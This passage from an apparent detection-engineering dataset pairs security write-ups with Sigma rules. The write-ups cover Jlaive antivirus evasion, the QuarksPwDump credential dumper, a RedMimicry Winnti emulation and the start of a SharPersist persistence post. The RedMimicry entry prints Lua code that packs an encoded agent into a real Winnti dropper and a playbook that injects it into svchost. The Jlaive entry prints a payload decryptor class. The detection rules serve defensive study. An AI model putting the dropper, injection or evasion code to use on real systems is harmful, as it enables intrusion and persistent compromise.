code.\n\n```image\nAlt: tmpfiles\nDescription: The image displays a detailed table capturing file operations performed by the process 'KatzNetAssembly.bat.exe'. It includes columns for 'Process Name', 'PID', 'Parent', 'Operation', 'Path', 'Result', and 'Detail'. Each row shows instances where the process wrote files in the specified paths, indicating the success of each operation. The paths include temporary files located in the user's AppData directory, specifically related to the execution of PowerShell scripts.\nTranscription: |\n  | Process Name            | PID  | Parent... | Operation | Path                                                                   | Result  | Detail                                  |\n  |-------------------------|------|-----------|-----------|------------------------------------------------------------------------|---------|-----------------------------------------|\n  | KatzNetAssembly.bat.exe | 8576 | 2980      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qbqelrry.bj2.ps1  | SUCCESS | Offset 0, Length: 80. Priority: Normal  |\n  | KatzNetAssembly.bat.exe | 8576 | 2980      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\__PSScriptPolicyTest_x50yswwi.4tu.psm1 | SUCCESS | Offset 0, Length: 80. Priority: Normal  |\n  | KatzNetAssembly.bat.exe | 8576 | 2980      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.0.cs                          | SUCCESS | Offset 0, Length: 744. Priority: Normal |\n  | KatzNetAssembly.bat.exe | 8576 | 2980      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.cmdline                       | SUCCESS | Offset 0, Length: 347. Priority: Normal |\n  | KatzNetAssembly.bat.exe | 8576 | 2980      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.out                           | SUCCESS | Offset 0, Length: 498. Priority: Normal |\n```\n\nSubsequently, it also removes these files from the system.\n\n```image\nAlt: tmpfilesdeleted\nDescription: The image depicts a table containing logs from a process named 'KatzNetAssembly.bat.exe.' It shows the Process ID (PID), Parent Process ID, the operation performed (SetDispositionInfo), the file paths of associated temporary files, the result of the operation (all marked as SUCCESS), and details indicating the deletion of each file. The paths include temporary files such as 'wzpaloqi.cmdline' and 'wzpaloqi.0.cs,' which were generated during the execution of the assembly for defense evasion purposes.\nTranscription: |\n  Process Name                PID    Parent...    Operation                Path                                                                     Result     Detail\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qbqelrry.bj2.ps1    SUCCESS    Delete: True\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\__PSScriptPolicyTest_x50yswwi.4tu.psm1   SUCCESS    Delete: True\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.err                             SUCCESS    Delete: True\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.cmdline                         SUCCESS    Delete: True\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.out                             SUCCESS    Delete: True\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.tmp                             SUCCESS    Delete: True\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.0.cs                            SUCCESS    Delete: True\n  KatzNetAssembly.bat.exe     8576   2980         SetDispositionInfo...    C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                             SUCCESS    Delete: True\n```\n\n### csc.exe - 5952\n\n```\n\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.cmdline\"\n```\n\nDue to the above execution to load the assembly into memory, `csc.exe` is launched to perform the compilation (`csc.exe` is used by .NET to compile C# code).\n\nAs stated above, the `wzpaloqi.cmdline` file that is passed as a parameter to `csc.exe` contains the addresses to compile the code. In this case, the contents are as follows\n\n```\n/t:library /utf8output /R:\"System.dll\" /R:\"C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll\" /out:\"C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll\" /D:DEBUG /debug+ /optimize- /warnaserror  \"C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.0.cs\"\n```\n\nNote the use of the `/t` parameter to generate a `Library` TargetType. Also the references to the `System.dll` and `System.Management.Automation.dll` (Powershell) DLLs. Finally, the output file to `wzpaloqi.dll`.\n\n```image\nAlt: tmpfilesdeleted\nDescription: The image is a detailed log output showcasing the operations performed by the process 'csc.exe', specifically related to file writing actions in the Windows file system. It lists the process name, Process ID (PID), parent process ID, the operation (WriteFile), and the paths of the files being written, including 'wzpaloqi.dll' and related temporary files. Each entry indicates a 'SUCCESS' result for the write operations along with specific details such as offsets and lengths of the data written, demonstrating the steps involved in creating a .NET assembly for defense evasion.\nTranscription: |\n  | Process Name | PID  | Parent... | Operation | Path                                                                   | Result  | Detail                                      |\n  |--------------|------|-----------|-----------|------------------------------------------------------------------------|---------|---------------------------------------------|\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\CSC73E174637C7249A1B3624F5536864A1.TMP | SUCCESS | Offset 0, Length: 652, Priority: Normal     |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 0, Length: 64, Priority: Normal      |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 64, Length: 64, Priority: Normal     |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 128, Length: 248, Priority: Normal   |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 376, Length: 120, Priority: Normal   |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 496, Length: 16, Priority: Normal    |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 592, Length: 1.444, Priority: Normal |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 2.036, Length: 12, Priority: Normal  |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll                           | SUCCESS | Offset 2.048, Length: 680, Priority: Normal |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.out                           | SUCCESS | Offset 3.072, Length: 12, Priority: Normal  |\n  | csc.exe      | 5952 | 8576      | WriteFile | C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.out                           | SUCCESS | Offset 3.084, Length: 500, Priority: Normal |\n```\n\nThe `wzpaloqi.0.cs` file contains the definition of the class that was previously used by the `Add-Type` cmdlet in the `PowerShell` execution. The content of this C# file would look like the following.\n\n```\nusing System.Text;\nusing System.IO;\nusing System.IO.Compression;\nusing System.Security.Cryptography;\npublic class sIRAVQ {\n  public static byte[] agudvC(byte[] input, byte[] key, byte[] iv) {\n    AesManaged aes = new AesManaged();\n    aes.Mode = CipherMode.CBC;\n    aes.Padding = PaddingMode.PKCS7;\n    ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);\n    byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);\n    decryptor.Dispose();\n    aes.Dispose();\n    return decrypted;\n  }\n  public static byte[] WpDGoD(byte[] bytes) {\n    MemoryStream msi = new MemoryStream(bytes);\n    MemoryStream mso = new MemoryStream();\n    var gs = new GZipStream(msi, CompressionMode.Decompress);\n    gs.CopyTo(mso);\n    gs.Dispose();\n    msi.Dispose();\n    mso.Dispose();\n    return mso.ToArray();\n  }\n}\n```\n\n### cvtress.exe - 9520\n\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Users\\lab\\AppData\\Local\\Temp\\RES7B30.tmp\" \"c:\\Users\\lab\\AppData\\Local\\Temp\\CSC73E174637C7249A1B3624F5536864A1.TMP\"\n```\n\nThe purpose of `cvtress.exe` is to convert resources to objects at compile time. These objects will eventually be the ones linked into the final .exe.\n\n## Sigma rule\n\nThe behavior of this project is very characteristic, which can help us to create detection rules. For this reason, the following sigma rule can help us to detect these behaviors in our systems.\n\nLink to sigma rule:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_jlaive_batch_execution.yml\n\n```\ntitle: Jlaive Usage For Assembly Execution In-Memory\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\ndescription: Detect the use of Jlaive to execute assemblies in a copied PowerShell\nstatus: experimental\ndate: 2022/05/24\nmodified: 2022/05/24\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\nreferences:\n    - https://twitter.com/VakninHai/status/1517027824984547329\n    - https://github.com/ch2sh/Jlaive\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  parent_selection:\n    ParentImage|endswith: '\\cmd.exe'\n    ParentCommandLine|endswith: '.bat'\n  selection1:\n    Image|endswith: '\\xcopy.exe'\n    CommandLine|contains|all:\n      - 'powershell.exe'\n      - '.bat.exe'\n  selection2:\n    Image|endswith: '\\attrib.exe'\n    CommandLine|contains|all:\n      - '+s'\n      - '+h'\n      - '.bat.exe'\n  condition: parent_selection and (1 of selection*)\nfalsepositives:\n    - Unknown\nlevel: medium\ntags:\n    - attack.execution\n    - attack.t1059.003\n```\n\n---\n\n**Tags**:\nthreat hunting\ndetection\nvisibility\nresearch\n.NET",
    "sigma_rule": {
      "title": "HackTool - Jlaive In-Memory Assembly Execution",
      "id": "0a99eb3e-1617-41bd-b095-13dc767f3def",
      "status": "test",
      "description": "Detects the use of Jlaive to execute assemblies in a copied PowerShell",
      "references": [
        "https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool",
        "https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive"
      ],
      "author": "Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)",
      "date": "2022-05-24",
      "modified": "2023-02-22",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "parent_selection": {
          "ParentImage|endswith": "\\cmd.exe",
          "ParentCommandLine|endswith": ".bat"
        },
        "selection1": {
          "Image|endswith": "\\xcopy.exe",
          "CommandLine|contains|all": [
            "powershell.exe",
            ".bat.exe"
          ]
        },
        "selection2": {
          "Image|endswith": "\\xcopy.exe",
          "CommandLine|contains|all": [
            "pwsh.exe",
            ".bat.exe"
          ]
        },
        "selection3": {
          "Image|endswith": "\\attrib.exe",
          "CommandLine|contains|all": [
            "+s",
            "+h",
            ".bat.exe"
          ]
        },
        "condition": "parent_selection and (1 of selection*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_jlaive_batch_execution.yml",
    "id": "213"
  },
  {
    "url": "https://github.com/quarkslab/quarkspwdump",
    "markdown": "# quarkslab / quarkspwdump\n\n## Folders and Files\n- src\n- CHANGELOG.txt\n- MAKE.txt\n- QuarksADDumper.sln\n- README.md\n- README.txt\n\n## README\n\n### quarkspwdump\n\nDump various types of Windows credentials without injecting in any process.",
    "sigma_rule": {
      "title": "HackTool - Quarks PwDump Execution",
      "id": "0685b176-c816-4837-8e7b-1216f346636b",
      "status": "test",
      "description": "Detects usage of the Quarks PwDump tool via commandline arguments",
      "references": [
        "https://github.com/quarkslab/quarkspwdump",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-05",
      "modified": "2023-02-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\QuarksPwDump.exe"
        },
        "selection_cli": {
          "CommandLine": [
            " -dhl",
            " --dump-hash-local",
            " -dhdc",
            " --dump-hash-domain-cached",
            " --dump-bitlocker",
            " -dhd ",
            " --dump-hash-domain ",
            "--ntds-file"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_quarks_pwdump.yml",
    "id": "222"
  },
  {
    "url": "https://web.archive.org/web/20240222070028/https://redmimicry.com/posts/redmimicry-winnti/",
    "markdown": "# RedMimicry Prototype - Winnti Emulation\n\n## The RedMimicry Platform Prototype\n\n*This post describes an early RedMimicry prototype and does not reflect the current state of the product.*\n\nThe RedMimicry platform prototype is built in a modular way in order to provide a good framework for the implementation of emulation profiles.\n\nEmulation profiles can be divided into the following components:\n\n- payload delivery and staging\n- command & control traffic encoding\n- automated breach emulation script\n\nThis RedMimicry release aims to emulate the behavior of the Winnti malware from around 2015. \nNaturally, not all behavior is exactly replicated, but the profile implemented here is hopefully doing a decent job.\n\n```image\nAlt: RedMimicry architecture\nDescription: The image presents a diagram illustrating the architecture of the RedMimicry platform prototype. It features a 'RedMimicry Server' with components including a 'dropper template binary,' 'LUA dropper integration script,' 'LUA Communication Script,' and 'LUA Breach Emulation Playbook Script.' Additionally, an 'Agent' section is depicted, which includes another 'LUA Communication Script.' The layout emphasizes the modular design of the platform, highlighting how different scripts interact within the server and agent setup.\nTranscription: |\n  RedMimicry Server\n  ┌─────────────────────────────────┐\n  │                                 │\n  │  ┌───────────────────────────┐  │\n  │  │  dropper template         │  │\n  │  │  binary                   │  │\n  │  └───────────────────────────┘  │\n  │                                 │\n  │  ┌───────────────────────────┐  │\n  │  │  LUA dropper              │  │\n  │  │  integration script       │  │\n  │  └───────────────────────────┘  │\n  │                                 │\n  │  ┌───────────────────────────┐  │\n  │  │  LUA Communication Script │  │\n  │  └───────────────────────────┘  │\n  │                                 │\n  │  ┌───────────────────────────┐  │\n  │  │  LUA Breach Emulation     │  │\n  │  │  Playbook Script          │  │\n  │  └───────────────────────────┘  │\n  └─────────────────────────────────┘\n  \n  Agent\n  ┌─────────────────────────────────┐\n  │                                 │\n  │  ┌───────────────────────────┐  │\n  │  │  LUA Communication Script │  │\n  │  └───────────────────────────┘  │\n  └─────────────────────────────────┘\n```\n\n## Dropper\n\nThere have been a multitude of different droppers for Winnti over the years. \nOne of the more distinct mechanisms observed is a configuration where an intermediate dropper is used to start the Winnti dropper itself, which then injects Winnti into a `svchost` process.\n\nOSINT describing this behavior:\n\n- NOVETTA Winnti (2015)\n- BfV Cyber-Brief Nr. 01/2019 (German)\n\nThis behavior is emulated as shown below.\n\n```image\nAlt: Winnti dropper chain\nDescription: The image depicts a flowchart illustrating the dropper chain process for the Winnti malware emulation. It consists of labeled blocks showing the sequence of actions: 'sigcmm-2.4.dll' feeds into a 'tmp.bat' file, which then leads to 'gthread-3.6.dll', ultimately resulting in the execution of 'svchost.exe -k netsvcs'. The flowchart uses a black background with red and white text to clearly delineate each component of the dropper process.\nTranscription: The image depicts a flowchart illustrating the dropper chain process for the Winnti malware emulation. It consists of labeled blocks showing the sequence of actions: 'sigcmm-2.4.dll' feeds into a 'tmp.bat' file, which then leads to 'gthread-3.6.dll', ultimately resulting in the execution of 'svchost.exe -k netsvcs'. The flowchart uses a black background with red and white text to clearly delineate each component of the dropper process.\n```\n\nIn order to provide a realistic emulation of this dropper process, I looked for an original Winnti dropper with a code cave large enough to hold the unstaged RedMimicry agent payload. The original payload of the Winnti dropper is simply replaced with a properly encoded version of the RedMimicry agent.\n\nA few small modifications had to be made to the dropper to properly execute the embedded agent.\n\nPractically speaking, this part of the emulation profile consists of a (slightly modified) original Winnti dropper and the following LUA script to integrate the dropper with the RedMimicry server.\n\n```\n-- 180004168  31c9               xor     ecx, ecx  {0x0}\n-- 18000416a  48c7c241414141     mov     rdx, 0x41414141\n-- 180004171  41b800100000       mov     r8d, 0x1000\n-- 180004177  41b940000000       mov     r9d, 0x40\n-- 18000417d  ff1595ee1600       call    qword [rel VirtualAlloc]\n-- 180004183  41b841414141       mov     r8d, 0x41414141\n\nlocal jumpInPayloadMarker = \"31c9\" ..\n        \"48c7c241414141\" ..\n        \"41b800100000\" ..\n        \"41b940000000\" ..\n        \"ff1595ee1600\" ..\n        \"41b841414141\"\n\nlocal configMarker = \"125db7b8-3002-4da8-915e-fbcc0280aa53AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\nlocal payloadCaveLength = 1378817\n\nlocal config = \"redmimicry.com - actor emulation and breach simulation tool\"\n\nfunction embed_payload(template, payloadId)\n    payload = build_payload(\"injectable_core\", payloadId)\n    payloadKey = random_bytes(1)\n    pattern = \"0289e00c-52c9-4f1b-b865-f637074daf1e\" .. string.rep(\"A\", payloadCaveLength - 36)\n    payload = pad(payload, string.len(pattern) - 1)\n    encryptedPayload = payloadKey .. XorIncNs(payloadKey, payload)\n    template = replace(template, pattern, encryptedPayload)\n    local jmpInPayload = string.fromhex(jumpInPayloadMarker)\n    jmpInPayload = replace(jmpInPayload, \"AAAA\", struct.pack(\"<I4\", payloadCaveLength - 1))\n    template = replace(template, string.fromhex(jumpInPayloadMarker), jmpInPayload)\n    configKey = string.fromhex(\"99\")\n    template = replace(template, configMarker, XorInc(configKey, pad(config, string.len(configMarker))))\n    return template\nend\n```\n\nThe dropper generated this way is used for *sigcmm-2.4.dll* and *gthread-3.6.dll*. AV software with proper signature coverage of Winnti artifacts should detect this either as RbDoor or directly as Winnti.\n\nA Yara rule to match this payload is available at redmimicry_winnti_2015.yar.\n\n## Command & Control Traffic Encoding\n\nWinnti has a very particular custom command and control traffic encoding. \nThe application layer encoding has been implemented in a publicly available Winnti Nmap Script. \nRedMimicry utilizes a reimplementation of the application layer encoding in order to provide a realistic emulation of the network traffic.\n\nA Winnti *HELO* payload is prepended to each transaction.\n\n```image\nAlt: Winnti C2 encoding\nDescription: The image depicts a diagram illustrating the command and control (C2) traffic encoding used by the Winnti malware. It shows two main components: the 'Winnti HELO' payload and the 'RedMimicry Transaction (encrypted)', both enclosed within a larger box labeled 'Winnti encoding'. This visual representation effectively conveys the structure of the traffic encoding, highlighting the addition of the Winnti HELO payload to each transaction.\nTranscription: |\n  Winnti HELO   RedMimicry Transaction (encrypted)\n  \n  Winnti encoding\n```\n\n## Automated Breach Emulation\n\nProbably the heart of RedMimicry is the automated breach emulation engine. \nEmulation profiles contain one or multiple LUA scripts defining the behavior of the agent after an automated breach emulation has been started.\n\nThe Winnti emulation script takes care of emulating the staging process of the Winnti implant and eventually injecting an agent payload into the *svchost.exe -k netsvcs* process.\n\nAfter the staging is completed, a real Winnti payload is written (but not executed) to read-write-executable memory in the *svchost.exe* process. \nAdditionally, a registry entry is created at `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\HTMLHelp\\data` and an event object is created at `Global\\BFE_Notify_Event_{65a097fe-6102-446a-9f9c-55dfc3f411016}`.\n\nThe following script implements the Automated Breach Emulation for Winnti.\n\n```\nfunction start_assessment()\n    -- set sleep time to 5 sec\n    SetSleep(5, 3)\n\n    -- check for elevated context\n    hostinfo = Interrogate()\n    if hostinfo == FAILURE then\n        return FAILURE\n    end\n    if hostinfo.elevated ~= true then\n        Log(\"\", \"The agent must be run from an elevated context for this playbook!\")\n        return FAILURE\n    end\n\n    -- drop winnti intermediate dropper dll\n    local payloadIdDropper0 = math.random(0xfffffffe) + 1\n    Log(\"T1027\", \"Building encoded payload with Winnti dropper\")\n    if Upload(\"C:\\\\Windows\\\\Temp\", \"gthread-3.6.dll\", BuildPayload(\"winnti\", payloadIdDropper0)) == FAILURE then\n        return FAILURE\n    end\n\n    -- drop winnti dropper dll\n    Mkdir(\"C:\\\\Program Files\\\\VMware\\\\VMware Tools\")\n    Log(\"T1027\", \"Building encoded payload with Winnti dropper\")\n    local payloadIdDropper1 = math.random(0xfffffffe) + 1\n    if Upload(\"C:\\\\Program Files\\\\VMware\\\\VMware Tools\", \"sigcmm-2.4.dll\", BuildPayload(\"winnti\", payloadIdDropper1)) == FAILURE then\n        return FAILURE\n    end\n\n    -- start intermediate dropper\n    Log(\"T1085\", \"Starting Winnti intermediate dropper with rundll32.exe\")\n    if Shell(\"C:\\\\Windows\\\\Temp\", \"rundll32.exe gthread-3.6.dll,XML\") == FAILURE then\n        return FAILURE\n    end\n\n    -- wait for connection of intermediate dropper\n    local agentIdDropper0 = GetAgentIdFromPayloadId(payloadIdDropper0)\n    local i = 0\n    while agentIdDropper0 == FAILURE do\n        if i > 30 then\n            return FAILURE\n        end\n        Sleep(10)\n        agentIdDropper0 = GetAgentIdFromPayloadId(payloadIdDropper0)\n        i = i + 1\n    end\n\n    -- kill assessment agent\n    KillAgent()\n\n    -- set sleep for intermediate dropper\n    SetSleepD(5, 3, agentIdDropper0)\n\n    -- drop intermediate dropper batch script\n    if UploadD(\"C:\\\\Windows\\\\Temp\", \"tmp.bat\", ReadFile(\"script.bat\"), agentIdDropper0) == FAILURE then\n        return FAILURE\n    end\n\n    -- execute bat file\n    LogD(\"T1064\", \"Using script to start Winnti dropper\", agentIdDropper0)\n    if CreateProcessD(\"C:\\\\Windows\\\\Temp\\\\tmp.bat\", agentIdDropper0) == FAILURE then\n        return FAILURE\n    end\n\n    -- wait for winnti dropper connection\n    local agentIdDropper1 = GetAgentIdFromPayloadId(payloadIdDropper1)\n    i = 0\n    while agentIdDropper1 == FAILURE do\n        if i > 30 then\n            return FAILURE\n        end\n        Sleep(10)\n        agentIdDropper1 = GetAgentIdFromPayloadId(payloadIdDropper1)\n        i = i + 1\n    end\n\n    -- set sleep for winnti dropper agent down\n    SetSleepD(5, 3, agentIdDropper1)\n\n    -- kill intermediate dropper\n    KillAgentD(agentIdDropper0)\n\n    -- inject agent into svchost.exe -k netsvcs\n    local svchost_pid = -1\n    procs = PsD(agentIdDropper1)\n    if procs == FAILURE then\n        return FAILURE\n    end\n    for k,v in pairs(procs) do\n        if v.commandline == \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k netsvcs -p\" then\n            svchost_pid = v.pid\n            break\n        elseif v.commandline == \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k netsvcs\" then\n            svchost_pid = v.pid\n            break\n        elseif v.commandline == \"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p\" then\n            svchost_pid = v.pid\n            break\n        elseif v.commandline == \"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs\" then\n            svchost_pid = v.pid\n            break\n        end\n    end\n    if svchost_pid == -1 then\n        return FAILURE\n    end\n    local payloadIdWinnti = math.random(0xfffffffe) + 1\n    if InjectAgentD(svchost_pid, payloadIdWinnti, agentIdDropper1) == FAILURE then\n        return FAILURE\n    end\n    local agentIdWinnti = GetAgentIdFromPayloadId(payloadIdWinnti)\n    i = 0\n    while agentIdWinnti == FAILURE do\n        if i > 30 then\n            return FAILURE\n        end\n        Sleep(10)\n        agentIdWinnti = GetAgentIdFromPayloadId(payloadIdWinnti)\n        i = i + 1\n    end\n\n    -- kill injector agent\n    KillAgentD(agentIdDropper1)\n\n    -- set sleep to 5 sec for winnti agent\n    SetSleepD(5, 3, agentIdWinnti)\n\n    -- write winnti payload to rwx memory\n    WriteRWXD(ReadFile(\"winnti.bin\"), agentIdWinnti)\n\n    -- create event\n    CreateEventD(\"Global\\\\BFE_Notify_Event_{65a097fe-6102-446a-9f9c-55dfc3f411016}\", agentIdWinnti)\n\n    -- create registry key\n    CreateRegistryKeyD(\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\HTMLHelp\", \"data\", \"aHR0cHM6Ly9yZWRtaW1pY3J5LmNvbQ==\", agentIdWinnti)\n\n    return SUCCESS\nend\n```\n\nMany of the events triggered on the endpoint can be matched with relatively simple Sigma rules.\n\n## Limitations\n\nOf course, this emulation is not perfect, and several aspects like the Winnti kernel mode component and the peer-to-peer traffic functionality are not emulated.\n\nRedMimicry does not support forward-connecting command & control protocols, thus the agent is beaconing to the server while the real Winnti behaves like a bind shell.",
    "sigma_rule": {
      "title": "HackTool - RedMimicry Winnti Playbook Execution",
      "id": "95022b85-ff2a-49fa-939a-d7b8f56eeb9b",
      "status": "test",
      "description": "Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility",
      "references": [
        "https://web.archive.org/web/20240222070028/https://redmimicry.com/posts/redmimicry-winnti/"
      ],
      "author": "Alexander Rausch",
      "date": "2020-06-24",
      "modified": "2023-03-01",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1106",
        "attack.t1059.003",
        "attack.t1218.011"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\rundll32.exe",
            "\\cmd.exe"
          ],
          "CommandLine|contains": [
            "gthread-3.6.dll",
            "\\Windows\\Temp\\tmp.bat",
            "sigcmm-2.4.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_redmimicry_winnti_playbook.yml",
    "id": "224"
  },
  {
    "url": "https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit",
    "markdown": "# SharPersist: Windows Persistence Toolkit in C#\n\n**September 3, 2019**\n\n---\n\n### Written by: Brett Hawkins\n\n---\n\n## Background\n\nPowerShell has been used by the offensive community for several years now, but recent advances in the defensive security industry are causing offensive toolkits to migrate from PowerShell to reflective C# to evade modern security products. Some of these advancements include Script Block Logging, Antimalware Scripting Interface (AMSI), and the development of signatures for malicious PowerShell activity by third-party security vendors. Several public C# toolkits such as Seatbelt, SharpUp, and SharpView have been released to assist with tasks in various phases of the attack lifecycle. One phase of the attack lifecycle that has been missing a C# toolkit is persistence. This post will talk about a new Windows Persistence Toolkit created by FireEye Mandiant’s Red Team called SharPersist.\n\n## Windows Persistence\n\nDuring a Red Team engagement, a lot of time and effort is spent gaining initial access to an organization, so it is vital that the access is maintained in a reliable manner. Therefore, persistence is a key component in the attack lifecycle, shown in Figure 1.\n\n```image\nAlt: FireEye Attack Lifecycle Diagram\nDescription: The image depicts the FireEye Attack Lifecycle Diagram, illustrating various stages of an attack sequence. It shows a circular flow of activities involved in a cyber attack, including steps such as 'Initial Reconnaissance', 'Initial Compromise', 'Establish Foothold', 'Escalate Privileges', 'Internal Reconnaissance', 'Move Laterally', 'Maintain Presence', 'Complete Mission', and 'Identify Target Data'. An arrow points towards 'Maintain Presence', highlighting its importance in the context of persistence during a cyber attack.\nTranscription: |\n  +------------------------+-------------------------+---------------------+-------------------+\n  | Initial Reconnaissance | Initial Compromise      | Establish Foothold  | Maintain Presence |\n  |                        |                         |                     |                   |\n  | Identify Exploitable   | Gain Initial Access     | Strengthen Position | Move Laterally    |\n  | Vulnerabilities        | Into Target             | within Target       |                   |\n  |                        |                         |                     |                   |\n  +------------------------+-------------------------+---------------------+-------------------+\n  | Escalate Privileges    | Internal Reconnaissance | Complete Mission    |                   |\n  |                        |                         |                     |                   |\n  | Steal Valid User       | Identify Target Data    | Package and Steal   |                   |\n  | Credentials            |                         | Target Data         |                   |\n  |                        |                         |                     |                   |\n  +------------------------+-------------------------+---------------------+-------------------+\n```\n\n*Figure 1: FireEye Attack Lifecycle Diagram*\n\nOnce an attacker establishes persistence on a system, the attacker will have continual access to the system after any power loss, reboots, or network interference. This allows an attacker to lay dormant on a network for extended periods of time, whether it be weeks, months, or even years. There are two key components of establishing persistence: the persistence implant and the persistence trigger, shown in Figure 2. The persistence implant is the malicious payload, such as an executable (EXE), HTML Application (HTA), dynamic link library (DLL), or some other form of code execution. The persistence trigger is what will cause the payload to execute, such as a scheduled task or Windows service. There are several known persistence triggers that can be used on Windows, such as Windows services, scheduled tasks, registry, and startup folder, and there continues to be more discovered. For a more thorough list, see the MITRE ATT&CK persistence page.\n\n```image\nAlt: Persistence equation\nDescription: The image illustrates a simple equation relating to the concept of persistence in cybersecurity. It shows three labeled boxes: 'Implant', 'Trigger', and 'Persistence'. The equation states that 'Implant + Trigger = Persistence'. The boxes are visually represented in a red color scheme, conveying a straightforward message about how a malicious implant combined with a trigger mechanism results in persistent access in a system.\nTranscription: |\n  Implant + Trigger = Persistence\n```\n\n*Figure 2: Persistence equation*\n\n## SharPersist Overview\n\nSharPersist was created in order to assist with establishing persistence on Windows operating systems using a multitude of different techniques. It is a command line tool written in C# which can be reflectively loaded with Cobalt Strike’s “execute-assembly” functionality or any other framework that supports the reflective loading of .NET assemblies. SharPersist was designed to be modular to allow new persistence techniques to be added in the future. There are also several items related to tradecraft that have been built-in to the tool and its supported persistence techniques, such as file time stomping and running applications minimized or hidden.\n\nSharPersist and all associated usage documentation can be found at the SharPersist Mandiant GitHub page.\n\n## SharPersist Persistence 